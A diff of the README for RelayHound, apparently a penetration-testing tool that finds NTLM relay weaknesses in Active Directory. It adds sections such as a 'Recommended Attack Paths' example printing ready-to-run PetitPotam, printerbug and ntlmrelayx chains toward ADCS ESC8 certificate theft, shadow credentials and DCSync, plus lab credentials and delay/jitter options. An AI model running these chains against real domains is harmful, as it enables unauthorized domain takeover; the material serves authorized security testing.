@@ -67,21 +67,81 @@ python relayhound.py -d corp.local --dc-ip 10.10.10.1 -u lowpriv -p password123 
 python relayhound.py -d corp.local --dc-ip 10.10.10.1 -u lowpriv -p password123 --extra-targets 10.10.10.20 --attacker-ip 10.10.10.99 -v --find-relay-targets
 ```
 
-#### Specifying Extra Targets
+#### Filtering Modules
 
 ```bash
-# Multiple individual IPs
-python relayhound.py -d corp.local --dc-ip 10.10.10.1 -u lowpriv -p password123 --extra-targets 10.10.10.20,10.10.10.21,10.10.10.22
+# Run LDAP-based attacks only
+python relayhound.py -d north.sevenkingdoms.local --dc-ip 192.168.164.11 -u brandon.stark -p iseedeadpeople --modules rbcd,shadowcreds,laps,acl -v
 
-# CIDR range
-python relayhound.py -d corp.local --dc-ip 10.10.10.1 -u lowpriv -p password123 --extra-targets 10.10.10.0/24
-
-# Dash range
-python relayhound.py -d corp.local --dc-ip 10.10.10.1 -u lowpriv -p password123 --extra-targets 10.10.10.20-30
-
-# From a file (one entry per line, # for comments)
-python relayhound.py -d corp.local --dc-ip 10.10.10.1 -u lowpriv -p password123 --targets-file targets.txt
+# Run ADCS-related modules only
+python relayhound.py -d sevenkingdoms.local --dc-ip 192.168.164.10 -u cersei.lannister -p il0vejaime --modules adcs,esc11,kerberos -v
 ```
+
+---
+
+## Recommended Attack Paths
+
+After all checks complete, RelayHound cross-references results across modules to provide a list of complete, actionable attack chains, ordered by impact. Each chain is populated with real values from the scan: IPs, hostnames, CA names, writable computer objects. Commands are ready to run without manual substitution.
+
+Only chains where all required prerequisites are met are shown, ordered by impact.
+
+Each entry includes:
+- A command to trigger or capture inbound authentication from a target
+- A relay command to redirect that authentication to the target service
+- Notes on follow-up steps and impact
+
+Example output:
+
+```
+🔴 CRITICAL  Domain Compromise via ADCS ESC8
+  Prerequisites: ADCS ESC8 confirmed — certsrv HTTP endpoint accepts NTLM relay
+    # WebDAV coercion (WebClient running — bypasses SMB signing)
+    python3 PetitPotam.py -u lowpriv -p '<password>' -d corp.local <attacker-hostname>@80/share 10.10.10.1
+    ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
+  ↳ Relay DC machine account auth to certsrv → obtain DC certificate → PKINITtools or Rubeus to get TGT → DCSync
+
+🟠 HIGH  Shadow Credentials → PKINIT → NT Hash
+  Prerequisites: LDAP relay viable + writable computer (WEB01) + KDC cert + ADCS present
+    # Coerce authentication from target
+    printerbug.py corp.local/lowpriv@10.10.10.1 10.10.10.99
+    ntlmrelayx.py -t ldaps://10.10.10.1 --shadow-credentials --shadow-target WEB01$
+  ↳ Writes msDS-KeyCredentialLink → PKINIT TGT for target machine account. Then: PKINITtools getnthash.py → pass-the-hash.
+```
+
+The Recommended Attack Paths section is included in both the Markdown and HTML reports.
+
+---
+
+## Relay Target Finder (`--find-relay-targets`)
+
+When `--find-relay-targets` is passed, RelayHound performs an additional inbound ACL scan using your enumeration credential. It queries `nTSecurityDescriptor` on computer objects, the domain root, and high-value groups to find which principals have write (or read, for LAPS) rights over valuable AD objects.
+
+This takes a different angle from the rest of the tool. Rather than asking "can I relay _to_ X?", it asks "if I coerce account X into authenticating, which relay attack should I chain it with, and against which target object?" The output is a table of candidates — account, recommended attack, target object, and the specific right that makes it exploitable.
+
+```
+Relay Target Candidates
+╭──────────────────┬─────────────┬──────────────────────────┬───────────────────────────╮
+│ Account          │   Attack    │ Target Object            │ Right                     │
+├──────────────────┼─────────────┼──────────────────────────┼───────────────────────────┤
+│ robb.stark       │  ACLAbuse   │ Domain Root (DCSync path)│ WriteDACL                 │
+│                  │  RBCD       │ CASTELBLACK$             │ WriteDACL                 │
+│                  │  ShadowCreds│ CASTELBLACK$             │ WriteDACL                 │
+│ Key Admins       │  ShadowCreds│ CASTELBLACK$             │ WriteProperty(msDS-Key...)│
+╰──────────────────┴─────────────┴──────────────────────────┴───────────────────────────╯
+```
+
+Requires: `impacket` and `ldap3` (both available on Kali by default).
+
+---
+
+## Viability Logic
+
+| Result       | Meaning                                                                     |
+| ------------ | --------------------------------------------------------------------------- |
+| ✅ VIABLE     | All required prerequisites met and no optional checks failed                |
+| ⚠️ PARTIAL   | Required checks pass but one or more optional checks failed or were skipped |
+| ❌ NOT VIABLE | At least one required check failed                                          |
+| ❓ UNKNOWN    | All checks were skipped or errored                                          |
 
 ---
 
@@ -96,7 +156,7 @@ Target:
   --extra-targets           Comma-separated IPs, hostnames, CIDR ranges,
                             or dash ranges (e.g. 10.0.0.1,10.0.0.0/24,10.0.0.10-20)
   --attacker-ip             Your Kali/attacker IP (for WebDAV relay check)
-  --targets-file            File with target IPs/ranges, one per line (# for                                   comments)
+  --targets-file            File with target IPs/ranges, one per line (# for comments)
 
 Credentials:
   -u, --username            Domain username (low-privilege account)      [required]
@@ -106,10 +166,19 @@ Credentials:
 Options:
   -v, --verbose             Show per-check details in terminal
   --parallel                Run attack checks in parallel (faster)
+  --modules LIST            Comma-separated list of module short names to run
+                            (e.g. smb,rbcd,adcs). Invalid names print the full
+                            list of valid aliases and exit. 
+  --delay N                 Sleep N seconds between each attack module (default: 0)
+  --jitter N                Add up to N seconds of random variation to the delay
+                            (default: 0). Requires --delay.
   --timeout N               Network timeout in seconds (default: 10)
-  -o, --output FILE         Markdown report path (default:                                                     <domain>_ntlm_relay_report.md)
+  -o, --output FILE         Markdown report path (default:
+                            <domain>_ntlm_relay_report.md)
+  --output-json FILE        JSON report path (default: <domain>_ntlm_relay_report.json)
   --no-report               Skip writing Markdown and HTML reports
   --no-html                 Skip HTML report (keep Markdown only)
+  --no-json                 Skip writing the JSON report
   --relay-list FILE         Save SMB unsigned hosts for ntlmrelayx -tf
   --no-relay-list           Skip writing the relay targets file
   --find-relay-targets      Scan nTSecurityDescriptor ACLs to identify which
@@ -291,39 +360,6 @@ Relay NTLM to LDAPS to modify ACLs on AD objects — granting DCSync rights, add
 
 ---
 
-## Relay Target Finder (`--find-relay-targets`)
-
-When `--find-relay-targets` is passed, RelayHound performs an additional inbound ACL scan using your enumeration credential. Instead of checking what your account can do, it queries `nTSecurityDescriptor` on computer objects, the domain root, and high-value groups to find which principals have write (or read, for LAPS) rights that make them valuable coercion targets.
-
-The output answers: *"If I coerce account X into authenticating, which relay attack should I chain it with, and what's the target object?"*
-
-```
-Relay Target Candidates
-╭──────────────────┬─────────────┬──────────────────────────┬───────────────────────────╮
-│ Account          │   Attack    │ Target Object            │ Right                     │
-├──────────────────┼─────────────┼──────────────────────────┼───────────────────────────┤
-│ robb.stark       │  ACLAbuse   │ Domain Root (DCSync path)│ WriteDACL                 │
-│                  │  RBCD       │ CASTELBLACK$             │ WriteDACL                 │
-│                  │  ShadowCreds│ CASTELBLACK$             │ WriteDACL                 │
-│ Key Admins       │  ShadowCreds│ CASTELBLACK$             │ WriteProperty(msDS-Key...)│
-╰──────────────────┴─────────────┴──────────────────────────┴───────────────────────────╯
-```
-
-Requires: `impacket` and `ldap3` (both available on Kali by default).
-
----
-
-## Viability Logic
-
-| Result       | Meaning                                                                     |
-| ------------ | --------------------------------------------------------------------------- |
-| ✅ VIABLE     | All required prerequisites met and no optional checks failed                |
-| ⚠️ PARTIAL   | Required checks pass but one or more optional checks failed or were skipped |
-| ❌ NOT VIABLE | At least one required check failed                                          |
-| ❓ UNKNOWN    | All checks were skipped or errored                                          |
-
----
-
 ## External Tools Used
 
 The checker calls these tools if installed. Gracefully falls back or skips if not found.
@@ -378,7 +414,7 @@ ntlm_relay_checker/
 
 ## To Do List
 
-Fix pass-the-hash support — --nt-hash flag exists as an alternative to -p but the hash is not yet passed correctly to underlying tool calls. Currently falls back to empty password, causing checks to fail.
+Fix pass-the-hash support — `--nt-hash` flag exists as an alternative to `-p` but the hash is not yet passed correctly to underlying tool calls. Currently falls back to empty password, causing checks to fail.
 
 ```bash
 python relayhound.py -d corp.local --dc-ip 10.10.10.1 -u lowpriv --nt-hash <nthash>
